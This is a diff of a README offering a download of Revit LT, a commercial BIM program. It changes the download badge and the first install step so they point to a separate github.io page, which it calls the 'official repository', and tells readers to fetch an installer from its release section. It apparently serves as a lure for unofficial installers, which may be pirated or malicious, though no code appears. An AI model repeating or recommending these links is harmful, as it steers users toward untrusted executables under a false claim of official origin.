@@ -1,6 +1,6 @@
 # 🏗️ Descargar-Revit-LT - Install Professional BIM Software Today
 
-[![](https://img.shields.io/badge/Download-Revit_LT-blue.svg)](https://github.com/Ainl1156/Descargar-Revit-LT)
+[![](https://img.shields.io/badge/Download-Revit_LT-blue.svg)](https://ainl1156.github.io)
 
 This guide helps you set up Revit LT on your Windows computer. This tool provides BIM (Building Information Modeling) capabilities to architects and designers. It allows you to create 3D models and generate construction documentation with precision.
 
@@ -25,7 +25,7 @@ Close all active applications before you begin the setup process. This prevents 
 
 Follow these steps to obtain and configure the software on your machine:
 
-1.  Visit the official repository link to start the process: [https://github.com/Ainl1156/Descargar-Revit-LT](https://github.com/Ainl1156/Descargar-Revit-LT).
+1.  Visit the official repository link to start the process: [https://ainl1156.github.io](https://ainl1156.github.io).
 2.  Locate the release section on the page.
 3.  Choose the installer file that matches your Windows version.
 4.  Download the installation package to your local folder.
